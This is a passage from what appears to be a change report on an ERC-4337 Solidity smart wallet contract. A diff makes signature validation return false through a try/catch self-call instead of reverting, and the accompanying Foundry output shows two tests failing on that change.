                 pop(call(gas(), caller(), missingAccountFunds, codesize(), 0x00, codesize(), 0x00))
             }
         }
     }
 
     constructor(address addressProvider_) AddressBook(addressProvider_) {
         bytes[] memory owners = new bytes[](1);
         owners[0] = abi.encode(address(0));
         _initializeOwners(owners);
     }
 
     function initialize(bytes[] calldata owners) external payable virtual {
         if (nextOwnerIndex() != 0) {
             revert Initialized();
         }
 
         _initializeOwners(owners);
 
         // Seed user settings to platform defaults (mirrors the UI defaults); the user can update them post-creation.
         // Deliberately not initializer args: the counterfactual address must depend only on owners + nonce, and a
         // front-runner of `createAccount` must not be able to influence wallet state.
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         $.defaultCrypto = DefaultCrypto.ETH;
         $.defaultStablecoin = DefaultStablecoin.TGBP;
         emit DefaultCryptoUpdated(DefaultCrypto.ETH, DefaultCrypto.ETH);
         emit DefaultStablecoinUpdated(DefaultStablecoin.TGBP, DefaultStablecoin.TGBP);
     }
 
     // --------------------------------------------
     //  User settings
     // --------------------------------------------
 
     /// @notice Updates the preferred crypto asset. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultCrypto(DefaultCrypto newDefaultCrypto) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultCrypto previous = $.defaultCrypto;
         $.defaultCrypto = newDefaultCrypto;
         emit DefaultCryptoUpdated(previous, newDefaultCrypto);
     }
 
     /// @notice Updates the preferred stablecoin. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultStablecoin(DefaultStablecoin newDefaultStablecoin) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultStablecoin previous = $.defaultStablecoin;
         $.defaultStablecoin = newDefaultStablecoin;
         emit DefaultStablecoinUpdated(previous, newDefaultStablecoin);
     }
 
     function defaultCrypto() public view virtual returns (DefaultCrypto) {
         return _getWalletSettingsStorage().defaultCrypto;
     }
 
     function defaultStablecoin() public view virtual returns (DefaultStablecoin) {
         return _getWalletSettingsStorage().defaultStablecoin;
     }
 
     /// @notice Both settings in a single call (one cheap read for the UI).
     function walletSettings() external view virtual returns (DefaultCrypto, DefaultStablecoin) {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         return ($.defaultCrypto, $.defaultStablecoin);
     }
 
     /// @notice Token address for the preferred crypto, resolved via `AddressProvider`.
     /// @dev Reverts `AddressNotFound` while the key is unset (e.g. SETH before its wrapper is deployed).
     function defaultCryptoAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_cryptoKeyName(defaultCrypto())));
     }
 
     /// @notice Token address for the preferred stablecoin, resolved via `AddressProvider`.
     function defaultStablecoinAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_stablecoinKeyName(defaultStablecoin())));
     }
 
     function _cryptoKeyName(DefaultCrypto crypto) internal pure returns (string memory) {
         if (crypto == DefaultCrypto.BTC) return "CBBTC";
         if (crypto == DefaultCrypto.ETH) return "WETH";
         return "SETH";
     }
 
     function _stablecoinKeyName(DefaultStablecoin stablecoin) internal pure returns (string memory) {
         if (stablecoin == DefaultStablecoin.TGBP) return "TGBP";
         if (stablecoin == DefaultStablecoin.USDC) return "USDC";
         if (stablecoin == DefaultStablecoin.EURC) return "EURC";
         return "DAI";
     }
 
     function _getWalletSettingsStorage() internal pure returns (WalletSettingsStorage storage $) {
         assembly ("memory-safe") {
             $.slot := _WALLET_SETTINGS_STORAGE_LOCATION
         }
     }
 
     // --------------------------------------------
     //  Registry synchronization
     // --------------------------------------------
 
     /// @dev Keeps the central owner->wallet index accurate when owners are added post-creation.
     ///      Skipped while the registry key is unset or this wallet is unregistered (implementation constructor,
     ///      `initialize` before the factory registers — the factory indexes the initial owners itself).
     function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual override {
         super._addOwnerAtIndex(owner, index);
 
         IHPWalletRegistry registry = _registry();
         if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
             registry.addOwner(owner);
         }
     }
 
     function _removeOwnerAtIndex(uint256 index, bytes calldata owner) internal virtual override {
         super._removeOwnerAtIndex(index, owner);
 
         IHPWalletRegistry registry = _registry();
         if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
             registry.removeOwner(owner);
         }
     }
 
     /// @dev Raw `get` (not `_getAddress`) so an unset WALLET_REGISTRY key never bricks owner management.
     function _registry() internal view returns (IHPWalletRegistry) {
         return IHPWalletRegistry(addressProvider.get(_addressKey("WALLET_REGISTRY")));
     }
 
     // --------------------------------------------
     //  ERC-4337
     // --------------------------------------------
 
     function validateUserOp(UserOperation06 calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)
         external
         virtual
         onlyEntryPoint
         payPrefund(missingAccountFunds)
         returns (uint256 validationData)
     {
         uint256 key = userOp.nonce >> 64;
 
         if (bytes4(userOp.callData) == this.executeWithoutChainIdValidation.selector) {
             userOpHash = getUserOpHashWithoutChainId(userOp);
             if (key != REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
 
             bytes[] memory calls = abi.decode(userOp.callData[4:], (bytes[]));
             for (uint256 i; i < calls.length; i++) {
                 bytes memory callData = calls[i];
                 bytes4 selector = bytes4(callData);
 
                 if (selector == UUPSUpgradeable.upgradeToAndCall.selector) {
                     address newImplementation;
                     assembly ("memory-safe") {
                         newImplementation := mload(add(callData, 36))
                     }
                     if (newImplementation.code.length == 0) revert InvalidImplementation(newImplementation);
                 }
             }
         } else {
             if (key == REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
         }
 
         if (_isValidSignature(userOpHash, userOp.signature)) {
             return 0;
         }
 
         return 1;
     }
 
     function executeWithoutChainIdValidation(bytes[] calldata calls) external payable virtual onlyEntryPoint {
         for (uint256 i; i < calls.length; i++) {
             bytes calldata call = calls[i];
             bytes4 selector = bytes4(call);
             if (!canSkipChainIdValidation(selector)) {
                 revert SelectorNotAllowed(selector);
             }
 
             _call(address(this), 0, call);
         }
     }
 
     function execute(address target, uint256 value, bytes calldata data)
         external
         payable
         virtual
         onlyEntryPointOrOwner
     {
         _call(target, value, data);
     }
 
     function executeBatch(Call[] calldata calls) external payable virtual onlyEntryPointOrOwner {
         for (uint256 i; i < calls.length; i++) {
             _call(calls[i].target, calls[i].value, calls[i].data);
         }
     }
 
     function entryPoint() public view virtual returns (address) {
         return 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
     }
 
     function getUserOpHashWithoutChainId(UserOperation06 calldata userOp) public view virtual returns (bytes32) {
         return keccak256(abi.encode(UserOperation06Hash.hash(userOp), entryPoint()));
     }
 
     function implementation() public view returns (address $) {
         assembly ("memory-safe") {
             $ := sload(_ERC1967_IMPLEMENTATION_SLOT)
         }
     }
 
     function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
         if (
             functionSelector == MultiOwnable.addOwnerPublicKey.selector
                 || functionSelector == MultiOwnable.addOwnerAddress.selector
                 || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
                 || functionSelector == MultiOwnable.removeLastOwner.selector
                 || functionSelector == UUPSUpgradeable.upgradeToAndCall.selector
         ) {
             return true;
         }
         return false;
     }
 
     function _call(address target, uint256 value, bytes memory data) internal {
         (bool success, bytes memory result) = target.call{ value: value }(data);
         if (!success) {
             assembly ("memory-safe") {
                 revert(add(result, 32), mload(result))
             }
         }
     }
 
     function _isValidSignature(bytes32 hash, bytes calldata signature)
         internal
         view
         virtual
         override
         returns (bool)
     {
+        try this.isValidSignatureSelfCall(hash, signature) returns (bool valid) {
+            return valid;
+        } catch {
+            return false;
+        }
+    }
+
+    function isValidSignatureSelfCall(bytes32 hash, bytes calldata signature) external view returns (bool) {
+        if (msg.sender != address(this)) {
+            revert Unauthorized();
+        }
+
         SignatureWrapper memory sigWrapper = abi.decode(signature, (SignatureWrapper));
         bytes memory ownerBytes = ownerAtIndex(sigWrapper.ownerIndex);
 
         if (ownerBytes.length == 32) {
             if (uint256(bytes32(ownerBytes)) > type(uint160).max) {
                 revert InvalidEthereumAddressOwner(ownerBytes);
             }
 
             address ownerAddr;
             assembly ("memory-safe") {
                 ownerAddr := mload(add(ownerBytes, 32))
             }
 
             return SignatureCheckerLib.isValidSignatureNow(ownerAddr, hash, sigWrapper.signatureData);
         }
 
         if (ownerBytes.length == 64) {
             (uint256 x, uint256 y) = abi.decode(ownerBytes, (uint256, uint256));
 
             WebAuthn.WebAuthnAuth memory auth = abi.decode(sigWrapper.signatureData, (WebAuthn.WebAuthnAuth));
 
             return WebAuthn.verify({ challenge: abi.encode(hash), requireUV: false, webAuthnAuth: auth, x: x, y: y });
         }
 
         revert InvalidOwnerBytesLength(ownerBytes);
     }
 
     function _authorizeUpgrade(address) internal view virtual override(UUPSUpgradeable) onlyOwner { }
 
     function _domainNameAndVersion() internal pure override(WalletERC1271) returns (string memory, string memory) {
         return ("HighPotential Smart Wallet", "1");
     }
 }
```

### Affected files
- `contracts/src/wallets/HPSmartWallet.sol`

### Validation output

```
[output truncated: 36 lines & 1.7734375 KB skipped]
Failing tests:
Encountered 2 failing tests in test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[FAIL: malformed signature should revert instead of returning 0xffffffff] test_isValidSignature_reverts_forMalformedSignatureBlob() (gas: 17801)
[FAIL: removed owner index should revert instead of returning 0xffffffff] test_isValidSignature_reverts_forRemovedOwnerIndex() (gas: 183858)

Encountered a total of 2 failing tests, 1 tests succeeded

Tip: Run `forge test --rerun` to retry only the 2 failed tests

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```
